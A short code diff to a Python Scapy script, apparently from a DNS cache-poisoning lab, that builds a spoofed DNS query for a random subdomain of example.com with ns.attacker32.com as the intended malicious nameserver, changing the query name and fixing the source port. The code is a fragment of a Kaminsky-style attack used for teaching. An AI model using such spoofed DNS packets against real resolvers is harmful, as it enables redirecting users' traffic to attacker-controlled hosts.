@@ -7,7 +7,7 @@ apoloIP = "10.9.0.53"
 nsIPs = ["199.43.133.53", "199.43.135.53"]
 
 domain = 'example.com'
-name = 'www.example.com'
+name = 'aaaaa.example.com'
 ns = 'ns.attacker32.com'
 port = RandShort()
 
@@ -15,7 +15,7 @@ port = RandShort()
 Qdsec = DNSQR(qname=name)
 dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
 ip = IP(dst=apoloIP, src=attackerIP)
-udp = UDP(dport=53, sport=port, chksum=0)
+udp = UDP(dport=53, sport=33333, chksum=0)
 request = ip/udp/dns
 
 # Save the packet to a file
